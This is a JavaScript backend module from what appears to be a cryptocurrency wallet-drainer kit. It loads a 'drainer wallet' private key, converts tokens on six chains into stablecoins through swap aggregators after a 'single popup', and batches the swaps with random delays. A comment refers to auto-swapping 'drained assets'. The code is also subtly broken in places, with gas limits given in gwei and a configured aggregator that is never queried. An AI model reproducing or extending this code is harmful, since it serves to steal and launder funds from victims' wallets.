// backend/modules/tokenSwapper.js
import { ethers } from "ethers";
import { securityManager } from './securityManager.js';
import { atomicBundler } from './atomicBundler.js';

export class TokenSwapper {
    constructor() {
        this.isInitialized = false;
        this.providers = new Map();
        this.drainerWallet = null;
        
        // Single-popup configurations
        this.singlePopupConfig = {
            maxSwapTime: 20000,
            minProfitThreshold: ethers.parseUnits('0.001', 'ether'),
            maxSlippage: 0.5, // 0.5%
            priorityStablecoins: ['USDC', 'USDT', 'DAI'],
            autoSwapEnabled: true
        };

        this.aggregatorConfig = {
            '1inch': {
                enabled: true,
                priority: 1,
                baseUrl: 'https://api.1inch.io/v5.0'
            },
            'paraswap': {
                enabled: true,
                priority: 2,
                baseUrl: 'https://api.paraswap.io/v5'
            },
            'uniswap': {
                enabled: true,
                priority: 3,
                baseUrl: 'https://api.uniswap.org/v1'
            },
            'openocean': {
                enabled: true,
                priority: 4,
                baseUrl: 'https://open-api.openocean.finance/v2'
            }
        };

        this.stablecoins = {
            '1': {
                'USDC': '0xA0b86991c6218b36c1d19D4a2e9eb0cE3606eB48',
                'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F'
            },
            '56': {
                'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
                'USDT': '0x55d398326f99059fF775485246999027B3197955',
                'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
            },
            '137': {
                'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
                'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
                'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063'
            },
            '42161': {
                'USDC': '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
                'USDT': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
                'DAI': '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1'
            },
            '10': {
                'USDC': '0x7F5c764cBc14f9669B88837ca1490cCa17c31607',
                'USDT': '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
                'DAI': '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1'
            },
            '43114': {
                'USDC': '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',
                'USDT': '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
                'DAI': '0xd586E7F844cEa2F87f50152665BCbc2C279D8d70'
            }
        };

        this.gasEstimates = {
            '1': ethers.parseUnits('50000', 'gwei'),    // Ethereum
            '56': ethers.parseUnits('10000', 'gwei'),   // BSC
            '137': ethers.parseUnits('40000', 'gwei'),  // Polygon
            '42161': ethers.parseUnits('30000', 'gwei'), // Arbitrum
            '10': ethers.parseUnits('35000', 'gwei'),   // Optimism
            '43114': ethers.parseUnits('25000', 'gwei')  // Avalanche
        };
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            this.initializeProviders();
            
            if (process.env.DRAINER_PK) {
                this.drainerWallet = new ethers.Wallet(process.env.DRAINER_PK, this.providers.get('1'));
                console.log(`✅ Drainer wallet initialized`);
            }
            
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    initializeProviders() {
        const rpcUrls = {
            '1': process.env.ETHEREUM_RPC_URL,
            '56': process.env.BSC_RPC_URL,
            '137': process.env.POLYGON_RPC_URL,
            '42161': process.env.ARBITRUM_RPC_URL,
            '10': process.env.OPTIMISM_RPC_URL,
            '43114': process.env.AVALANCHE_RPC_URL
        };

        for (const [chainId, url] of Object.entries(rpcUrls)) {
            if (url) {
                this.providers.set(chainId, new ethers.JsonRpcProvider(url));
                console.log(`✅ RPC Provider initialized for chain ${chainId}`);
            }
        }
    }

    async executeSinglePopupSwap(tokenAddress, amount, chainId = '1', userWallet) {
        console.log(`🎯 Executing single-popup swap for token: ${tokenAddress}`);
        
        const startTime = Date.now();
        const swapId = `swap_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
        
        try {
            // Check if swap is profitable
            const isProfitable = await this.isSwapProfitable(tokenAddress, amount, chainId);
            if (!isProfitable) {
                return {
                    success: false,
                    swapId: swapId,
                    reason: 'Not profitable',
                    tokenAddress: tokenAddress,
                    chainId: chainId
                };
            }

            // Get best stablecoin for chain
            const stablecoinAddress = this.getBestStablecoin(chainId);
            
            // Find best swap route
            const swapRoute = await this.findBestSwapRoute(
                tokenAddress,
                stablecoinAddress,
                amount,
                chainId
            );

            if (!swapRoute) {
                throw new Error('No swap route found');
            }

            // Execute swap
            const swapResult = await this.executeSwap(
                swapRoute,
                userWallet,
                chainId
            );

            const result = {
                success: true,
                swapId: swapId,
                txHash: swapResult.txHash,
                fromToken: tokenAddress,
                toToken: stablecoinAddress,
                amountIn: amount,
                amountOut: swapResult.amountOut,
                chainId: chainId,
                executionTime: Date.now() - startTime,
                aggregator: swapRoute.aggregator
            };

            await securityManager.storeSwapResult(swapId, result);
            return result;

        } catch (error) {
            console.error(`❌ Single-popup swap failed: ${error.message}`);
            
            const failedResult = {
                success: false,
                swapId: swapId,
                error: error.message,
                tokenAddress: tokenAddress,
                chainId: chainId,
                executionTime: Date.now() - startTime
            };

            await securityManager.storeSwapResult(swapId, failedResult);
            return failedResult;
        }
    }

    async isSwapProfitable(tokenAddress, amount, chainId) {
        try {
            if (amount === 0n) return false;

            const tokenValue = await this.estimateTokenValue(tokenAddress, amount, chainId);
            const gasCost = await this.estimateSwapGasCost(chainId);
            const minThreshold = this.singlePopupConfig.minProfitThreshold;

            return tokenValue > gasCost && tokenValue > minThreshold;
        } catch {
            return false;
        }
    }

    async estimateTokenValue(tokenAddress, amount, chainId) {
        try {
            const provider = this.providers.get(chainId);
            
            if (tokenAddress === '0x0000000000000000000000000000000000000000') {
                const ethPrice = await this.fetchETHPrice();
                const ethAmount = parseFloat(ethers.formatEther(amount));
                return ethAmount * ethPrice;
            }

            const tokenPrice = await this.fetchTokenPrice(tokenAddress, chainId);
            const decimals = await this.getTokenDecimals(tokenAddress, provider);
            const tokenAmount = parseFloat(ethers.formatUnits(amount, decimals));
            
            return tokenAmount * tokenPrice;

        } catch (error) {
            console.warn(`⚠️ Token value estimation failed: ${error.message}`);
            return 0;
        }
    }

    async estimateSwapGasCost(chainId) {
        try {
            const gasPrice = await this.getCurrentGasPrice(chainId);
            const gasLimit = this.gasEstimates[chainId] || ethers.parseUnits('50000', 'gwei');
            const gasCost = gasPrice * gasLimit;
            
            return parseFloat(ethers.formatEther(gasCost));
        } catch {
            return 0.05; // Default $0.05
        }
    }

    async getCurrentGasPrice(chainId) {
        try {
            const provider = this.providers.get(chainId);
            return await provider.getGasPrice();
        } catch {
            return ethers.parseUnits('30', 'gwei');
        }
    }

    async findBestSwapRoute(fromToken, toToken, amount, chainId) {
        const aggregators = Object.entries(this.aggregatorConfig)
            .filter(([name, config]) => config.enabled)
            .sort((a, b) => a[1].priority - b[1].priority);

        let bestRoute = null;
        let bestOutput = 0n;

        for (const [name, config] of aggregators) {
            try {
                const route = await this.queryAggregator(name, fromToken, toToken, amount, chainId);
                
                if (route && route.expectedOutput > bestOutput) {
                    bestOutput = route.expectedOutput;
                    bestRoute = route;
                }

                // Break early if we have a good route and we're in single-popup mode
                if (bestRoute && bestOutput > 0) {
                    break;
                }

            } catch (error) {
                console.warn(`⚠️ ${name} aggregator failed: ${error.message}`);
            }
        }

        return bestRoute;
    }

    async queryAggregator(aggregatorName, fromToken, toToken, amount, chainId) {
        switch (aggregatorName) {
            case '1inch':
                return await this.query1Inch(fromToken, toToken, amount, chainId);
            case 'paraswap':
                return await this.queryParaSwap(fromToken, toToken, amount, chainId);
            case 'uniswap':
                return await this.queryUniswap(fromToken, toToken, amount, chainId);
            default:
                return null;
        }
    }

    async query1Inch(fromToken, toToken, amount, chainId) {
        try {
            const apiKey = process.env.INCH_API_KEY;
            const baseUrl = `${this.aggregatorConfig['1inch'].baseUrl}/${chainId}`;
            
            const response = await fetch(`${baseUrl}/swap?fromTokenAddress=${fromToken}&toTokenAddress=${toToken}&amount=${amount}&slippage=${this.singlePopupConfig.maxSlippage}`, {
                headers: apiKey ? { 'Authorization': `Bearer ${apiKey}` } : {},
                timeout: 5000
            });

            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            
            const data = await response.json();

            return {
                aggregator: '1inch',
                expectedOutput: BigInt(data.toTokenAmount),
                gasEstimate: BigInt(data.estimatedGas),
                txData: data.tx.data,
                txTo: data.tx.to,
                value: BigInt(data.tx.value || 0)
            };

        } catch (error) {
            throw new Error(`1inch query failed: ${error.message}`);
        }
    }

    async queryParaSwap(fromToken, toToken, amount, chainId) {
        try {
            const baseUrl = this.aggregatorConfig['paraswap'].baseUrl;
            const response = await fetch(`${baseUrl}/${chainId}/prices?srcToken=${fromToken}&destToken=${toToken}&amount=${amount}&side=SELL`, {
                timeout: 5000
            });

            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            
            const priceData = await response.json();
            const bestPrice = priceData.priceRoute;

            return {
                aggregator: 'paraswap',
                expectedOutput: BigInt(bestPrice.destAmount),
                gasEstimate: BigInt(bestPrice.gasCost),
                txData: bestPrice.tx.data,
                txTo: bestPrice.tx.to,
                value: BigInt(bestPrice.tx.value || 0)
            };

        } catch (error) {
            throw new Error(`ParaSwap query failed: ${error.message}`);
        }
    }

    async queryUniswap(fromToken, toToken, amount, chainId) {
        try {
            const baseUrl = `${this.aggregatorConfig['uniswap'].baseUrl}/${chainId}`;
            const response = await fetch(`${baseUrl}/quote?tokenIn=${fromToken}&tokenOut=${toToken}&amountIn=${amount}&fee=3000`, {
                timeout: 5000
            });

            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            
            const data = await response.json();

            return {
                aggregator: 'uniswap',
                expectedOutput: BigInt(data.quote),
                gasEstimate: BigInt(data.gasUseEstimate),
                txData: data.methodParameters?.calldata,
                txTo: data.methodParameters?.to,
                value: BigInt(data.methodParameters?.value || 0)
            };

        } catch (error) {
            throw new Error(`Uniswap query failed: ${error.message}`);
        }
    }

    async executeSwap(swapRoute, userWallet, chainId) {
        try {
            const provider = this.providers.get(chainId);
            const gasPrice = await provider.getGasPrice();
            const gasLimit = BigInt(Math.floor(Number(swapRoute.gasEstimate) * 1.3));

            const tx = await userWallet.sendTransaction({
                to: swapRoute.txTo,
                data: swapRoute.txData,
                value: swapRoute.value,
                gasLimit: gasLimit,
                gasPrice: gasPrice,
                chainId: parseInt(chainId)
            });

            const receipt = await tx.wait();

            return {
                success: true,
                txHash: receipt.transactionHash,
                amountOut: swapRoute.expectedOutput,
                gasUsed: receipt.gasUsed.toString()
            };

        } catch (error) {
            throw new Error(`Swap execution failed: ${error.message}`);
        }
    }

    getBestStablecoin(chainId) {
        const chainStablecoins = this.stablecoins[chainId] || this.stablecoins['1'];
        return chainStablecoins[this.singlePopupConfig.priorityStablecoins[0]] || 
               Object.values(chainStablecoins)[0];
    }

    async fetchETHPrice() {
        try {
            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd', {
                timeout: 3000
            });
            const data = await response.json();
            return data.ethereum?.usd || 2000;
        } catch {
            return 2000;
        }
    }

    async fetchTokenPrice(tokenAddress, chainId) {
        try {
            if (tokenAddress === '0x0000000000000000000000000000000000000000') {
                return await this.fetchETHPrice();
            }

            // Use decentralized price feeds or coingecko
            const response = await fetch(`https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${tokenAddress}&vs_currencies=usd`, {
                timeout: 3000
            });
            
            const data = await response.json();
            return data[tokenAddress.toLowerCase()]?.usd || 0;

        } catch {
            return 0;
        }
    }

    async getTokenDecimals(tokenAddress, provider) {
        try {
            if (tokenAddress === '0x0000000000000000000000000000000000000000') return 18;
            
            const contract = new ethers.Contract(tokenAddress, [
                'function decimals() view returns (uint8)'
            ], provider);
            
            return await contract.decimals();
        } catch {
            return 18;
        }
    }

    async batchSwapTokens(swapOperations, chainId = '1') {
        console.log(`🔄 Batch swapping ${swapOperations.length} tokens`);
        
        const results = {};
        
        for (const operation of swapOperations) {
            try {
                results[operation.tokenAddress] = await this.executeSinglePopupSwap(
                    operation.tokenAddress,
                    operation.amount,
                    chainId,
                    operation.userWallet
                );
                
                await this.randomDelay(1000, 3000);
                
            } catch (error) {
                results[operation.tokenAddress] = {
                    success: false,
                    error: error.message
                };
            }
        }
        
        return results;
    }

    async randomDelay(minMs = 1000, maxMs = 5000) {
        const delay = Math.floor(Math.random() * (maxMs - minMs + 1)) + minMs;
        return new Promise(resolve => setTimeout(resolve, delay));
    }

    getSwapStats() {
        const stats = {
            totalSwaps: 0,
            successful: 0,
            failed: 0,
            totalVolume: 0n,
            byAggregator: {}
        };
        
        // Would implement actual stats tracking
        return stats;
    }
}

export const tokenSwapper = new TokenSwapper();
// Add missing autoSwapDrainedAssets function

export default new TokenSwapper();
